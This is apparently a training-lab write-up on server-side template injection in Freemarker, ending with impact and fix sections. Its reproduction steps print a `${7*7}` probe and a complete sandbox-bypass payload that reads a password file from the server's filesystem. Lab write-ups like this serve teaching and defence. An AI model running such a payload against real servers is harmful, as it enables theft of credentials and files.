# Lab
Server-side Template Injection via Sandbox Bypass (Freemarker)

## Summary
SSTI vulnerability. The attacker can break out of the sandbox to read 
the file `my_password.txt` from Carlos's home directory.

## Steps to reproduce
1. Log in to the account.
2. Go to any product page and edit the template.
3. Try to bypass the sandbox in the template box.
4. Enter `${7*7}` — the output is 49, confirming the input is evaluated 
   as a template expression.
5. Enter this payload:
`${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`
6. The output is the content of `my_password.txt`, returned as a list 
   of decimal ASCII codes (since Freemarker can't print a raw byte 
   array as a string directly).
7. Convert the ASCII codes to plain text (e.g. using an online decimal-to-text 
   converter) to recover the plaintext password.

## Impact
The attacker can read any file on the server's filesystem that the 
application process has permission to access — e.g. config files, 
source code, credentials.

## Fix
1. Don't expose objects with a reachable `.class` property in the 
   template context.
2. Use a stricter sandbox implementation.
3. Consider not evaluating user input as a template where avoidable.